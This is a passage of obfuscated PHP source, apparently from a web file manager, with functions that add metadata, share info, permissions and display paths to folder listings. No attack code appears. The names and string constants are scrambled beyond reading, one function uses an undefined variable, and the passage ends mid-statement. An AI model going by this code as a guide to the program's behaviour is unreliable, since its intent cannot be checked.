$»ÌŒú à = Model($äÓ•Í·ç[549])->field($äÓ•Í·ç[550])->where($Ù¨ª³€ã)->select(); if (!$»ÌŒú à) { return; } $šâıœ—¸ = array($äÓ•Í·ç[551], $äÓ•Í·ç[552], $äÓ•Í·ç[531]); $‡©ËŒƒÍ = array(); foreach ($»ÌŒú à as $ï­Ş÷¼•) { if (!isset($‡©ËŒƒÍ[$ï­Ş÷¼•[$äÓ•Í·ç[191]]])) { $‡©ËŒƒÍ[$ï­Ş÷¼•[$äÓ•Í·ç[191]]] = array(); } if (in_array($ï­Ş÷¼•[$äÓ•Í·ç[95]], $šâıœ—¸)) { continue; } if ($ï­Ş÷¼•[$äÓ•Í·ç[95]] == $äÓ•Í·ç[553]) { $ï­Ş÷¼•[$äÓ•Í·ç[451]] = $äÓ•Í·ç[554]; } $‡©ËŒƒÍ[$ï­Ş÷¼•[$äÓ•Í·ç[191]]][$ï­Ş÷¼•[$äÓ•Í·ç[95]]] = $ï­Ş÷¼•[$äÓ•Í·ç[451]]; } foreach ($²õ®ÎÕå as &$ş†ŒËÔì) { $ş†ŒËÔì[$äÓ•Í·ç[555]] = !1; if (isset($‡©ËŒƒÍ[$ş†ŒËÔì[$äÓ•Í·ç[191]]])) { $ş†ŒËÔì[$äÓ•Í·ç[555]] = $‡©ËŒƒÍ[$ş†ŒËÔì[$äÓ•Í·ç[191]]]; } if ($this->fileIsLock($ş†ŒËÔì) && $ş†ŒËÔì[$äÓ•Í·ç[502]]) { $ú´…ö‹Ó = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ş†ŒËÔì[$äÓ•Í·ç[502]][$äÓ•Í·ç[503]] = AuthModel::authDisable($ş†ŒËÔì[$äÓ•Í·ç[502]][$äÓ•Í·ç[503]], $ú´…ö‹Ó); $ş†ŒËÔì[$äÓ•Í·ç[502]][$äÓ•Í·ç[556]][$äÓ•Í·ç[502]] = $ş†ŒËÔì[$äÓ•Í·ç[502]][$äÓ•Í·ç[503]]; } } unset($ş†ŒËÔì); } protected function _listAppendFileMeta(&$’¿‚Ìñ‡, $Ù™ášÌÓ) { $¦ˆ‹á£¯ =& $_SERVER[œ—üé‹ê]; $˜ª¶¸ = array_to_keyvalue($’¿‚Ìñ‡, $¦ˆ‹á£¯[12], $¦ˆ‹á£¯[557]); $˜ª¶¸ = array_filter(array_unique($˜ª¶¸)); $˜ª¶¸ = array_to_int($˜ª¶¸); if (!$˜ª¶¸) { return; } $³“á×Âğ = array($¦ˆ‹á£¯[558] => array($¦ˆ‹á£¯[507], $˜ª¶¸)); $ª¼Åğí™ = $¦ˆ‹á£¯[559]; $çóª‹ÆÏ = Model($¦ˆ‹á£¯[560])->field($ª¼Åğí™)->where($³“á×Âğ)->select(); $çóª‹ÆÏ = array_to_keyvalue($çóª‹ÆÏ, $¦ˆ‹á£¯[557]); $‹­±ƒ‰¡ = Model($¦ˆ‹á£¯[561])->field($¦ˆ‹á£¯[562])->where($³“á×Âğ)->select(); $‹­±ƒ‰¡ = $‹­±ƒ‰¡ ? $‹­±ƒ‰¡ : array(); $Ïô·Ÿ‘¬ = array(); foreach ($‹­±ƒ‰¡ as $˜Ê§ğÚè) { if (!isset($Ïô·Ÿ‘¬[$˜Ê§ğÚè[$¦ˆ‹á£¯[557]]])) { $Ïô·Ÿ‘¬[$˜Ê§ğÚè[$¦ˆ‹á£¯[557]]] = array(); } $Ïô·Ÿ‘¬[$˜Ê§ğÚè[$¦ˆ‹á£¯[557]]][$˜Ê§ğÚè[$¦ˆ‹á£¯[95]]] = $˜Ê§ğÚè[$¦ˆ‹á£¯[451]]; } foreach ($’¿‚Ìñ‡ as &$®¢Éû«¢) { $£¼»¨Šæ = $®¢Éû«¢[$¦ˆ‹á£¯[557]]; if (!$£¼»¨Šæ || !is_array($çóª‹ÆÏ[$£¼»¨Šæ])) { continue; } $©ö»ÔĞ = $çóª‹ÆÏ[$£¼»¨Šæ]; $©ö»ÔĞ[$¦ˆ‹á£¯[79]] = $®¢Éû«¢[$¦ˆ‹á£¯[79]]; $©ö»ÔĞ[$¦ˆ‹á£¯[32]] = $®¢Éû«¢[$¦ˆ‹á£¯[32]]; if (!$©ö»ÔĞ[$¦ˆ‹á£¯[563]]) { Model($¦ˆ‹á£¯[560])->fileMd5Check($©ö»ÔĞ); } if (!isset(self::$cacheFileInfo[$¦ˆ‹á£¯[564] . $£¼»¨Šæ])) { self::$cacheFileInfo[$¦ˆ‹á£¯[564] . $£¼»¨Šæ] = array_merge(array(), $©ö»ÔĞ); } unset($çóª‹ÆÏ[$£¼»¨Šæ][$¦ˆ‹á£¯[87]]); $Í”àšß = isset($Ïô·Ÿ‘¬[$£¼»¨Šæ]) && is_array($Ïô·Ÿ‘¬[$£¼»¨Šæ]) ? $Ïô·Ÿ‘¬[$£¼»¨Šæ] : array(); $®¢Éû«¢[$¦ˆ‹á£¯[167]] = array_merge($Í”àšß, $çóª‹ÆÏ[$£¼»¨Šæ]); if (isset($®¢Éû«¢[$¦ˆ‹á£¯[167]][$¦ˆ‹á£¯[182]])) { $®¢Éû«¢[$¦ˆ‹á£¯[182]] = json_decode($®¢Éû«¢[$¦ˆ‹á£¯[167]][$¦ˆ‹á£¯[182]], !0); unset($®¢Éû«¢[$¦ˆ‹á£¯[167]][$¦ˆ‹á£¯[182]]); } } unset($®¢Éû«¢); } protected function _listAppendSourceInfo(&$Ùå—ÂÅ, $ëÛĞØ£™) { $ìã›³„ =& $_SERVER[œ—üé‹ê]; $²Ä´í¸Á = Model($ìã›³„[565])->listData(); $öƒŞõ„¾ = Model($ìã›³„[514])->listData(); $£¯ß…Š¥ = Model($ìã›³„[504])->listData(); $Óˆ³ÎÖó = Model($ìã›³„[566])->listSimple(); $´±ğš¨ = array_to_keyvalue($²Ä´í¸Á, $ìã›³„[487]); $‚£°ç = array_to_keyvalue_group($öƒŞõ„¾, $ìã›³„[87], $ìã›³„[515]); $Üè„Ó½ = array_to_keyvalue($£¯ß…Š¥, $ìã›³„[87]); $ŸÊíŠ“ = array_to_keyvalue_group($Óˆ³ÎÖó, $ìã›³„[191]); foreach ($Ùå—ÂÅ as &$ˆ®Û™Ôç) { $ˆ®Û™Ôç[$ìã›³„[90]] = array($ìã›³„[567] => 0, $ìã›³„[568] => 0, $ìã›³„[569] => 0); if (isset($Üè„Ó½[$ˆ®Û™Ôç[$ìã›³„[191]]])) { $ˆ®Û™Ôç[$ìã›³„[90]][$ìã›³„[570]] = 1; $ˆ®Û™Ôç[$ìã›³„[90]][$ìã›³„[571]] = $Üè„Ó½[$ˆ®Û™Ôç[$ìã›³„[191]]][$ìã›³„[32]]; } if ($‚£°ç && $´±ğš¨ && isset($‚£°ç[$ˆ®Û™Ôç[$ìã›³„[191]]])) { $ˆ®Û™Ôç[$ìã›³„[90]][$ìã›³„[572]] = array(); foreach ($‚£°ç[$ˆ®Û™Ôç[$ìã›³„[191]]] as $ı‚¯–ÈÏ) { $ê¡…íÑ = $´±ğš¨[$ı‚¯–ÈÏ]; $ˆ®Û™Ôç[$ìã›³„[90]][$ìã›³„[572]][] = array($ìã›³„[573] => $ê¡…íÑ[$ìã›³„[487]], $ìã›³„[509] => $ê¡…íÑ[$ìã›³„[32]], $ìã›³„[574] => $ê¡…íÑ[$ìã›³„[575]]); } } if ($ŸÊíŠ“ && isset($ŸÊíŠ“[$ˆ®Û™Ôç[$ìã›³„[191]]])) { $ˆ®Û™Ôç[$ìã›³„[90]][$ìã›³„[576]] = array(); foreach ($ŸÊíŠ“[$ˆ®Û™Ôç[$ìã›³„[191]]] as $¸¯Ï’) { $ˆ®Û™Ôç[$ìã›³„[90]][$ìã›³„[576]] = $this->shareFilterShow($¸¯Ï’); } } } unset($ˆ®Û™Ôç); return $Ùå—ÂÅ; } protected function shareFilterShow($”€–’à¹) { $ï¿™Ê†Ì =& $_SERVER[œ—üé‹ê]; if (!$”€–’à¹) { return $”€–’à¹; } $ÑÄÜÖÚã = $ï¿™Ê†Ì[577]; if ($”€–’à¹[$ï¿™Ê†Ì[578]] == $ï¿™Ê†Ì[91]) { $ÑÄÜÖÚã .= $ï¿™Ê†Ì[579]; } if (is_array($”€–’à¹[$ï¿™Ê†Ì[580]]) && is_array($”€–’à¹[$ï¿™Ê†Ì[580]][$ï¿™Ê†Ì[581]])) { $”€–’à¹[$ï¿™Ê†Ì[580]][$ï¿™Ê†Ì[581]] = $ï¿™Ê†Ì[582]; } if (!$Œê•ÕÅ«[$ï¿™Ê†Ì[583]] && $Œê•ÕÅ«[$ï¿™Ê†Ì[191]] != $ï¿™Ê†Ì[228]) { $Œê•ÕÅ«[$ï¿™Ê†Ì[583]] = KodIO::make($Œê•ÕÅ«[$ï¿™Ê†Ì[191]]); } $”€–’à¹ = array_field_key($”€–’à¹, explode($ï¿™Ê†Ì[50], $ÑÄÜÖÚã)); return $”€–’à¹; } protected function _listAppendChildren(&$ÉğéÒş, $ƒç·×Ú’) { $Ôİ²ÃÒÓ =& $_SERVER[œ—üé‹ê]; $…ŠÛéåË = array(); $­”“ÃÁ‡ = array($Ôİ²ÃÒÓ[239] => 0, $Ôİ²ÃÒÓ[240] => 0); foreach ($ÉğéÒş as &$š«…êÍ) { if (!$š«…êÍ[$Ôİ²ÃÒÓ[500]]) { continue; } $…ŠÛéåË[] = intval($š«…êÍ[$Ôİ²ÃÒÓ[191]]); } unset($š«…êÍ); if (!$…ŠÛéåË) { return; } $ÎÆ½œò = array($Ôİ²ÃÒÓ[190] => array($Ôİ²ÃÒÓ[7], $…ŠÛéåË), $Ôİ²ÃÒÓ[520] => 0); $†¥ú¸Ç— = array($Ôİ²ÃÒÓ[190], $Ôİ²ÃÒÓ[500], $Ôİ²ÃÒÓ[584] => $Ôİ²ÃÒÓ[585]); $Ÿƒš˜ò = $this->field($†¥ú¸Ç—)->where($ÎÆ½œò)->group($Ôİ²ÃÒÓ[586])->select(); $÷šãÆøî = array(); foreach ($Ÿƒš˜ò as $ª³‡û½) { $› ­–ÑÃ = $ª³‡û½[$Ôİ²ÃÒÓ[190]]; $óÍ¨”ì = $ª³‡û½[$Ôİ²ÃÒÓ[500]] == $Ôİ²ÃÒÓ[91] ? $Ôİ²ÃÒÓ[240] : $Ôİ²ÃÒÓ[239]; if (!isset($÷šãÆøî[$› ­–ÑÃ])) { $÷šãÆøî[$› ­–ÑÃ] = array($Ôİ²ÃÒÓ[239] => 0, $Ôİ²ÃÒÓ[240] => 0); } $÷šãÆøî[$› ­–ÑÃ][$óÍ¨”ì] += $ª³‡û½[$Ôİ²ÃÒÓ[585]]; } foreach ($ÉğéÒş as &$š«…êÍ) { if (!$š«…êÍ[$Ôİ²ÃÒÓ[500]]) { continue; } $¤²ØÚÄ± = is_array($÷šãÆøî[$š«…êÍ[$Ôİ²ÃÒÓ[191]]]) ? $÷šãÆøî[$š«…êÍ[$Ôİ²ÃÒÓ[191]]] : $­”“ÃÁ‡; $š«…êÍ[$Ôİ²ÃÒÓ[240]] = $¤²ØÚÄ±[$Ôİ²ÃÒÓ[240]]; $š«…êÍ[$Ôİ²ÃÒÓ[239]] = $¤²ØÚÄ±[$Ôİ²ÃÒÓ[239]]; unset($š«…êÍ[$Ôİ²ÃÒÓ[501]]); } unset($š«…êÍ); } protected function _listAppendAuth(&$­àÃÖÔş) { $Æû÷±§Ê =& $_SERVER[œ—üé‹ê]; $ŠõÏÚáé = array(); foreach ($­àÃÖÔş as $éèıŒòÆ) { if ($éèıŒòÆ[$Æû÷±§Ê[188]] == self::TYPE_GROUP) { $ŠõÏÚáé[] = intval($éèıŒòÆ[$Æû÷±§Ê[191]]); } } if (!$ŠõÏÚáé) { return; } $ÍÊø·´ = array_to_keyvalue($­àÃÖÔş, $Æû÷±§Ê[191]); $îÎˆìĞı = Model($Æû÷±§Ê[587])->getSourceList($ŠõÏÚáé, $ÍÊø·´); $ÉÍ†ü¿¶ = KodUser::isRoot(); foreach ($­àÃÖÔş as $Ã‰‹Å‰ => &$éèıŒòÆ) { $éèıŒòÆ[$Æû÷±§Ê[502]] = $îÎˆìĞı[$éèıŒòÆ[$Æû÷±§Ê[191]]]; if (!$éèıŒòÆ[$Æû÷±§Ê[502]] && $éèıŒòÆ[$Æû÷±§Ê[188]] == self::TYPE_GROUP) { $éèıŒòÆ[$Æû÷±§Ê[502]] = Action($Æû÷±§Ê[588])->pathGroupAuthMake($éèıŒòÆ[$Æû÷±§Ê[589]]); if (!$éèıŒòÆ[$Æû÷±§Ê[502]] && !$ÉÍ†ü¿¶) { $éèıŒòÆ[$Æû÷±§Ê[233]] = !1; $éèıŒòÆ[$Æû÷±§Ê[232]] = !1; } } if ($éèıŒòÆ[$Æû÷±§Ê[502]]) { $éèıŒòÆ[$Æû÷±§Ê[233]] = AuthModel::authCheckEdit($éèıŒòÆ[$Æû÷±§Ê[502]][$Æû÷±§Ê[503]]); $éèıŒòÆ[$Æû÷±§Ê[232]] = AuthModel::authCheckView($éèıŒòÆ[$Æû÷±§Ê[502]][$Æû÷±§Ê[503]]); } $this->groupPathDisplay($éèıŒòÆ); } unset($éèıŒòÆ); } public function _listAppendAuthSecret(&$“šùÍ”±) { $ó·ü¨ =& $_SERVER[œ—üé‹ê]; if (Model($ó·ü¨[522])->get($ó·ü¨[590]) != $ó·ü¨[91]) { return; } static $€¤â”„ğ = false; if (!$€¤â”„ğ) { $‡ëà»Ä× = Model($ó·ü¨[591]); $¨Í¿ç× = Model($ó·ü¨[592]); $€¤â”„ğ = $¨Í¿ç×->listData(); $€¤â”„ğ = array_to_keyvalue($€¤â”„ğ, $ó·ü¨[191]); $âÂóÔƒ„ = json_decode(Model($ó·ü¨[522])->get($ó·ü¨[593]), !0); $âÂóÔƒ„ = array_to_keyvalue($âÂóÔƒ„, $ó·ü¨[487]); foreach ($€¤â”„ğ as $Ö¦³Ô¡ => $Íñ×Íæç) { $¢÷¿±Ğ‡ = $âÂóÔƒ„[$Íñ×Íæç[$ó·ü¨[594]]]; if (!$¢÷¿±Ğ‡) { $¨Í¿ç×->remove($Íñ×Íæç[$ó·ü¨[487]]); unset($€¤â”„ğ[$Ö¦³Ô¡]); continue; } $à©÷²¨Ï = $‡ëà»Ä×->listData($¢÷¿±Ğ‡[$ó·ü¨[502]]); if (!$à©÷²¨Ï) { $¨Í¿ç×->remove($Íñ×Íæç[$ó·ü¨[487]]); unset($€¤â”„ğ[$Ö¦³Ô¡]); continue; } $Íñ×Íæç[$ó·ü¨[502]] = $à©÷²¨Ï; $Íñ×Íæç[$ó·ü¨[595]] = $¢÷¿±Ğ‡; $Íñ×Íæç[$ó·ü¨[596]] = Model($ó·ü¨[597])->getInfoSimpleOuter($Íñ×Íæç[$ó·ü¨[541]]); $€¤â”„ğ[$Ö¦³Ô¡] = $Íñ×Íæç; } } $šû©‚±å = USER_ID; $û›¹˜ÆÎ = array(); $¬İÊ•Òı = $this->_listAppendPath($û›¹˜ÆÎ, !0); foreach ($“šùÍ”± as $Ö¦³Ô¡ => &$Íñ×Íæç) { if (!is_array($Íñ×Íæç[$ó·ü¨[502]])) { continue; } if ($Íñ×Íæç[$ó·ü¨[188]] != $ó·ü¨[598]) { continue; } if (isset($€¤â”„ğ[$Íñ×Íæç[$ó·ü¨[191]]])) { $„Ç¢İÙ´ = $€¤â”„ğ[$Íñ×Íæç[$ó·ü¨[191]]]; if (!is_array($Íñ×Íæç[$ó·ü¨[555]])) { $Íñ×Íæç[$ó·ü¨[555]] = array(); } $Íñ×Íæç[$ó·ü¨[555]][$ó·ü¨[599]] = $„Ç¢İÙ´[$ó·ü¨[594]]; $Íñ×Íæç[$ó·ü¨[502]][$ó·ü¨[600]] = $„Ç¢İÙ´; $Íñ×Íæç[$ó·ü¨[502]][$ó·ü¨[601]] = $Íñ×Íæç[$ó·ü¨[602]]; $Íñ×Íæç[$ó·ü¨[502]][$ó·ü¨[603]] = $ó·ü¨[91]; if ($„Ç¢İÙ´[$ó·ü¨[541]] != $šû©‚±å) { $Íñ×Íæç[$ó·ü¨[502]][$ó·ü¨[503]] = $Íñ×Íæç[$ó·ü¨[502]][$ó·ü¨[503]] & $„Ç¢İÙ´[$ó·ü¨[502]][$ó·ü¨[502]]; } continue; } $ê¯¾ÔÕĞ = $this->parentLevelArray($Íñ×Íæç[$ó·ü¨[604]]); $ÀËÉÖÃû = array_reverse($ê¯¾ÔÕĞ); foreach ($ÀËÉÖÃû as $úË—§å => $ÉÌ¥«õ©) { if (!isset($€¤â”„ğ[$ÉÌ¥«õ©])) { continue; } $„Ç¢İÙ´ = $€¤â”„ğ[$ÉÌ¥«õ©]; $Íñ×Íæç[$ó·ü¨[502]][$ó·ü¨[600]] = $„Ç¢İÙ´; if ($„Ç¢İÙ´[$ó·ü¨[541]] != $šû©‚±å) { $Íñ×Íæç[$ó·ü¨[502]][$ó·ü¨[503]] = $Íñ×Íæç[$ó·ü¨[502]][$ó·ü¨[503]] & $„Ç¢İÙ´[$ó·ü¨[502]][$ó·ü¨[502]]; } $¨çÒÓ¨à = $ó·ü¨[12]; $¢ÖĞòŸµ = count($ê¯¾ÔÕĞ) - $úË—§å; for ($ëÍšú ö = 0; $ëÍšú ö < $¢ÖĞòŸµ; $ëÍšú ö++) { if (!isset($¬İÊ•Òı[$ê¯¾ÔÕĞ[$ëÍšú ö]])) { $¨çÒÓ¨à = $ó·ü¨[12]; break; } $¨çÒÓ¨à = $¨çÒÓ¨à . rtrim($¬İÊ•Òı[$ê¯¾ÔÕĞ[$ëÍšú ö]], $ó·ü¨[8]) . $ó·ü¨[8]; } $Íñ×Íæç[$ó·ü¨[502]][$ó·ü¨[601]] = rtrim($¨çÒÓ¨à, $ó·ü¨[8]) . $ó·ü¨[8]; break; } } unset($Íñ×Íæç); } public function groupPathDisplay(&$òğÔÁş) { $ÔùŒîˆõ =& $_SERVER[œ—üé‹ê]; if ($òğÔÁş[$ÔùŒîˆõ[188]] != self::TYPE_GROUP) { return; } $ÇòÖ÷†Ş = Model($ÔùŒîˆõ[605])->getInfo($òğÔÁş[$ÔùŒîˆõ[589]]); $„ûñí¿’ = $this->parentLevelArray($ÇòÖ÷†Ş[$ÔùŒîˆõ[604]]); $Òíú®Õ = $ÔùŒîˆõ[12]; foreach ($„ûñí¿’ as $œÁ÷³ÕÇ) { $ ´œ¢½ì = Model($ÔùŒîˆõ[605])->getInfo($œÁ÷³ÕÇ); $Òíú®Õ .= $ ´œ¢½ì[$ÔùŒîˆõ[90]][$ÔùŒîˆõ[191]] . $ÔùŒîˆõ[50]; } $òğÔÁş[$ÔùŒîˆõ[606]] = $ÇòÖ÷†Ş[$ÔùŒîˆõ[190]]; $òğÔÁş[$ÔùŒîˆõ[607]] = $ÇòÖ÷†Ş[$ÔùŒîˆõ[604]]; $òğÔÁş[$ÔùŒîˆõ[608]] = $ÇòÖ÷†Ş[$ÔùŒîˆõ[609]]; $òğÔÁş[$ÔùŒîˆõ[610]] = $Òíú®Õ . $ÇòÖ÷†Ş[$ÔùŒîˆõ[90]][$ÔùŒîˆõ[191]]; } protected function _listAppendPath(&$òÕ¹”Üç, $ƒ‹ ¦É• = false) { $ƒïÙÃ¬‚ =& $_SERVER[œ—üé‹ê]; static $‘ùó˜ = array(); $¦ô²ğ¾ = array(); $äñ“»ßÊ = array(); if ($ƒ‹ ¦É•) { return $‘ùó˜; } foreach ($òÕ¹”Üç as &$‚ö¿Œì“) { $Î¯õĞ¥ = $‚ö¿Œì“[$ƒïÙÃ¬‚[191]]; if ($‚ö¿Œì“[$ƒïÙÃ¬‚[500]] == $ƒïÙÃ¬‚[91] && $‚ö¿Œì“[$ƒïÙÃ¬‚[190]] != 0) { $‘ùó˜[$Î¯õĞ¥] = $‚ö¿Œì“[$ƒïÙÃ¬‚[32]]; } if ($‚ö¿Œì“[$ƒïÙÃ¬‚[500]] == $ƒïÙÃ¬‚[91] && $‚ö¿Œì“[$ƒïÙÃ¬‚[190]] == 0) { $‘ùó˜[$Î¯õĞ¥] = $this->_listAppendPathRoot($‚ö¿Œì“, array()); } if (isset($äñ“»ßÊ[$‚ö¿Œì“[$ƒïÙÃ¬‚[604]]])) { continue; } $äñ“»ßÊ[$‚ö¿Œì“[$ƒïÙÃ¬‚[604]]] = !0; $—ÀßîÚ¢ = $this->parentLevelArray($‚ö¿Œì“[$ƒïÙÃ¬‚[604]]); foreach ($—ÀßîÚ¢ as $ÒÒ±Ò¿ => $Œ•“˜Ô…) { if (isset($‘ùó˜[$Œ•“˜Ô…])) { continue; } if ($ÒÒ±Ò¿ == 0) { $‘ùó˜[$Œ•“˜Ô…] = $this->_listAppendPathRoot($‚ö¿Œì“, $—ÀßîÚ¢); } if ($ÒÒ±Ò¿ != 0) { $¦ô²ğ¾[] = $Œ•“˜Ô…; } } } unset($‚ö¿Œì“); $¦ô²ğ¾ = array_unique($¦ô²ğ¾); if (count($¦ô²ğ¾) > 0) { $ëÅ´İ— = array($ƒïÙÃ¬‚[506] => array($ƒïÙÃ¬‚[507], $¦ô²ğ¾)); if (count($¦ô²ğ¾) == 1) { $ËÖä­Œê = $this->sourceInfo($¦ô²ğ¾[0]); $“¤Â«²« = is_array($ËÖä­Œê) ? array($ËÖä­Œê) : !1; } else { $“¤Â«²« = $this->field($ƒïÙÃ¬‚[611])->where($ëÅ´İ—)->select(); } if (!$“¤Â«²«) { $“¤Â«²« = array(); } foreach ($“¤Â«²« as $°‡·•Øó) { $‘ùó˜[$°‡·•Øó[$ƒïÙÃ¬‚[191]]] = $°‡·•Øó[$ƒïÙÃ¬‚[32]]; } } $âıïòöä = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Õ½ç€¸ = array(); foreach ($òÕ¹”Üç as &$‚ö¿Œì“) { $£–¹Û´Ğ = $‚ö¿Œì“[$ƒïÙÃ¬‚[604]]; $ºßú…ß = $ƒïÙÃ¬‚[12]; if (isset($Õ½ç€¸[$£–¹Û´Ğ])) { $ºßú…ß = $Õ½ç€¸[$£–¹Û´Ğ]; } else { $—ÀßîÚ¢ = $this->parentLevelArray($‚ö¿Œì“[$ƒïÙÃ¬‚[604]]); foreach ($—ÀßîÚ¢ as $ÒÒ±Ò¿ => $Œ•“˜Ô…) { if (isset($‘ùó˜[$Œ•“˜Ô…])) { $ºßú…ß .= $‘ùó˜[$Œ•“˜Ô…] . $ƒïÙÃ¬‚[8]; } } $Õ½ç€¸[$£–¹Û´Ğ] = $ºßú…ß; } $ºßú…ß .= $‚ö¿Œì“[$ƒïÙÃ¬‚[32]]; if ($‚ö¿Œì“[$ƒïÙÃ¬‚[500]] == $ƒïÙÃ¬‚[91]) { $ºßú…ß .= $ƒïÙÃ¬‚[8]; } $‚ö¿Œì“[$ƒïÙÃ¬‚[602]] = str_replace($ƒïÙÃ¬‚[254], $ƒïÙÃ¬‚[8], $ºßú…ß); if ($‚ö¿Œì“[$ƒïÙÃ¬‚[190]] == $ƒïÙÃ¬‚[228]) { $‚ö¿Œì“[$ƒïÙÃ¬‚[32]] = trim($‘ùó˜[$‚ö¿Œì“[$ƒïÙÃ¬‚[191]]], $ƒïÙÃ¬‚[8]); $‚ö¿Œì“[$ƒïÙÃ¬‚[602]] = $‚ö¿Œì“[$ƒïÙÃ¬‚[32]] . $ƒïÙÃ¬‚[8]; } if (intval($‚ö¿Œì“[$ƒïÙÃ¬‚[188]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($‚ö¿Œì“, $—ÀßîÚ¢, $âıïòöä); } } unset($‚ö¿Œì“); return $òÕ¹”Üç; } private function _listAppendPathRecycle(&$ºª¸è„—, $ûÌ¨òÉÂ, $ÊÉâÖ«„) { $úæÜˆ–³ =& $_SERVER[œ—üé‹ê]; if (!in_array($ÊÉâÖ«„, $ûÌ¨òÉÂ) && $ºª¸è„—[$úæÜˆ–³[191]] != $ÊÉâÖ«„) { return; } $íÖÄˆ§ô = explode($úæÜˆ–³[8], trim($ºª¸è„—[$úæÜˆ–³[602]], $úæÜˆ–³[8])); $ó¿×÷ø³ = implode($úæÜˆ–³[8], array_slice($íÖÄˆ§ô, 2)); $ºª¸è„—[$úæÜˆ–³[602]] = $úæÜˆ–³[8] . LNG($úæÜˆ–³[612]) . $úæÜˆ–³[8] . ltrim($ó¿×÷ø³, $úæÜˆ–³[8]); $ºª¸è„—[$úæÜˆ–³[604]] = $úæÜˆ–³[613] . implode($úæÜˆ–³[50], array_slice($ûÌ¨òÉÂ, 1)) . $úæÜˆ–³[50]; if ($ºª¸è„—[$úæÜˆ–³[191]] == $ÊÉâÖ«„) { $ºª¸è„—[$úæÜˆ–³[604]] = $úæÜˆ–³[613]; $ºª¸è„—[$úæÜˆ–³[190]] = $úæÜˆ–³[228]; $ºª¸è„—[$úæÜˆ–³[32]] = LNG($úæÜˆ–³[612]); } $ºª¸è„—[$úæÜˆ–³[614]] = $úæÜˆ–³[615]; } protected function _listAppendPathRoot(&$ËîÙôÑ¹, $Œªá»Æ³) { $¢™¼ÆÆß =& $_SERVER[œ—üé‹ê]; static $ä°¯Åõ“ = false; static $èñ¡´Äæ = false; $ÜØ ¥âŒ = $¢™¼ÆÆß[12]; if ($ËîÙôÑ¹[$¢™¼ÆÆß[188]] == self::TYPE_USER) { if ($ËîÙôÑ¹[$¢™¼ÆÆß[589]] == USER_ID) { $ÜØ ¥âŒ = LNG($¢™¼ÆÆß[616]); if ($ä°¯Åõ“ === !1) { $Ÿ«Ëš¦ª = Model($¢™¼ÆÆß[617])->getInfoFull(USER_ID); $ä°¯Åõ“ = _get($Ÿ«Ëš¦ª, $¢™¼ÆÆß[618], $¢™¼ÆÆß[12]); } if ($èñ¡´Äæ === !1) { $Ÿ«Ëš¦ª = Model($¢™¼ÆÆß[617])->getInfoFull(USER_ID); $èñ¡´Äæ = _get($Ÿ«Ëš¦ª, $¢™¼ÆÆß[619], $¢™¼ÆÆß[12]); } if ($Œªá»Æ³ && $Œªá»Æ³[0] == $ä°¯Åõ“ || !$Œªá»Æ³ && $ËîÙôÑ¹[$¢™¼ÆÆß[191]] == $ä°¯Åõ“) { $ÜØ ¥âŒ = LNG($¢™¼ÆÆß[620]); $ËîÙôÑ¹[$¢™¼ÆÆß[621]] = $¢™¼ÆÆß[622]; } if ($Œªá»Æ³ && $Œªá»Æ³[0] == $èñ¡´Äæ || !$Œªá»Æ³ && $ËîÙôÑ¹[$¢™¼ÆÆß[191]] == $èñ¡´Äæ) { $ÜØ ¥âŒ = $ÜØ ¥âŒ . $¢™¼ÆÆß[623] . LNG($¢™¼ÆÆß[624]); } if (!$Œªá»Æ³) { $ËîÙôÑ¹[$¢™¼ÆÆß[32]] = $ÜØ ¥âŒ; } } else { $Ÿ«Ëš¦ª = Model($¢™¼ÆÆß[617])->getInfoFull($ËîÙôÑ¹[$¢™¼ÆÆß[589]]); $ÛŞò·ó = _get($Ÿ«Ëš¦ª, $¢™¼ÆÆß[619], $¢™¼ÆÆß[12]); $ËîÙôÑ¹[$¢™¼ÆÆß[625]] = Model($¢™¼ÆÆß[597])->getInfoSimpleOuter($ËîÙôÑ¹[$¢™¼ÆÆß[589]]); $ÜØ ¥âŒ = LNG($¢™¼ÆÆß[626]) . $¢™¼ÆÆß[173] . $ËîÙôÑ¹[$¢™¼ÆÆß[625]][$¢™¼ÆÆß[32]] . $¢™¼ÆÆß[175]; if ($Œªá»Æ³ && $Œªá»Æ³[0] == $ÛŞò·ó || !$Œªá»Æ³ && $ËîÙôÑ¹[$¢™¼ÆÆß[191]] == $ÛŞò·ó) { $ÜØ ¥âŒ = LNG($¢™¼ÆÆß[626]) . $¢™¼ÆÆß[627] . $ËîÙôÑ¹[$¢™¼ÆÆß[625]][$¢™¼ÆÆß[32]] . $¢™¼ÆÆß[623] . LNG($¢™¼ÆÆß[624]) . $¢™¼ÆÆß[175]; } } } else { if ($ËîÙôÑ¹[$¢™¼ÆÆß[188]] == self::TYPE_GROUP) { $³öšışˆ = Model($¢™¼ÆÆß[605])->getInfoSimple($ËîÙôÑ¹[$¢™¼ÆÆß[589]]); $ÜØ ¥âŒ = $³öšışˆ[$¢™¼ÆÆß[32]]; } else { if ($ËîÙôÑ¹[$¢™¼ÆÆß[188]] == self::TYPE_SYSTEM) { $ÜØ ¥âŒ = $¢™¼ÆÆß[628]; } } } $ÜØ ¥âŒ = $ÜØ ¥âŒ ? $¢™¼ÆÆß[8] . $ÜØ ¥âŒ . $¢™¼ÆÆß[8] : $¢™¼ÆÆß[8]; return $ÜØ ¥âŒ; } protected function _listAppendUser(&$÷·…Óù) { $»ÕÎ°¶‰ =& $_SERVER[œ—üé‹ê]; $‡Åı¹ŒÆ = array_to_keyvalue($÷·…Óù, $»ÕÎ°¶‰[12], $»ÕÎ°¶‰[541]); $ª”¹´È” = array_to_keyvalue($÷·…Óù, $»ÕÎ°¶‰[12], $»ÕÎ°¶‰[543]); $Å½Âõ Ê = array_merge($‡Åı¹ŒÆ, $ª”¹´È”); $ñ •íİƒ = Model($»ÕÎ°¶‰[617])->userListInfo($Å½Âõ Ê); foreach ($÷·…Óù as &$úúÌÔã) { $øß©‡ä = $úúÌÔã[$»ÕÎ°¶‰[541]]; $úúÌÔã[$»ÕÎ°¶‰[541]] = $ñ •íİƒ[$øß©‡ä] ? $ñ •íİƒ[$øß©‡ä] : !1; $øß©‡ä = $úúÌÔã[$»ÕÎ°¶‰[543]]; $úúÌÔã[$»ÕÎ°¶‰[543]] = $ñ •íİƒ[$øß©‡ä] ? $ñ •íİƒ[$øß©‡ä] : !1; if (_get($úúÌÔã, $»ÕÎ°¶‰[629], 0)) { $¶ƒİé = $GLOBALS[$»ÕÎ°¶‰[6]][$»ÕÎ°¶‰[92]][$»ÕÎ°¶‰[630]]; if 